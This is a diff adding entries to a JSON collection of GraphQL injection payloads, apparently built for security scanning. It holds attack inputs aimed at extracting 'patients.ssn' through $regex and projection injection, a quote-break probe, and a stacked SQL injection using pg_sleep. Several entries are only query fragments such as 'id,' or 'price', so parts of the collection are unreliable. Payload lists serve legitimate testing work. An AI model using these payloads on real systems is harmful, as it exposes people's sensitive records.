+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "doctors(",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37280",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "options: \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37281",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\".*\\\"}, \\\"lastName\\\":\\\"Admin\\\" }\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37282",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "firstName lastName id patients{ssn}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37283",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "bacon(id: \"1'\") {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37284",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "id,",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37285",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "type,",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37286",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "price",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37287",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "user(name: \"patt';SELECT 1;SELECT pg_sleep(30);--'\") {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
